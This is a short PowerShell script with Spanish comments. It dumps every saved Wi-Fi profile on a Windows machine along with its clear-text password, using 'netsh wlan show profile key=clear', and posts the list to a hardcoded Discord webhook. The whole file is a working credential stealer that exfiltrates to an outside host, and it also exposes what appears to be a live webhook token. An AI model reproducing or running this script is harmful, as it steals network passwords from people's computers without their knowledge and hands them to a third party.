# Define la URL del webhook de Discord
$webhookUrl = "https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3"

# Ejecuta el comando para mostrar los perfiles de red Wi-Fi guardados
$profilesOutput = netsh wlan show profiles

# Filtra los nombres de los perfiles Wi-Fi
$profiles = $profilesOutput | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

# Inicializa una lista para almacenar los datos de las redes Wi-Fi
$networkData = @()

# Itera sobre cada perfil de red Wi-Fi
foreach ($name in $profiles) {
    # Muestra los detalles del perfil de red, incluyendo la clave si está disponible
    $profileDetailsOutput = netsh wlan show profile name="$name" key=clear
    
    # Extrae la contraseña del perfil de red, si está disponible
    $password = ($profileDetailsOutput | Select-String "Contenido de la clave\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }) -replace "^\s*$", "No disponible"
    
    # Almacena el nombre del perfil y la contraseña en la lista
    $networkData += [PSCustomObject]@{
        PERFIL = $name
        PASSWORD = $password
    }
}

# Crea el mensaje para enviar al webhook de Discord
$message = @{
    content = "Lista de redes Wi-Fi guardadas:`n" + ($networkData | Format-Table -AutoSize | Out-String)
} | ConvertTo-Json

# Envía el mensaje al webhook de Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $message -ContentType "application/json"
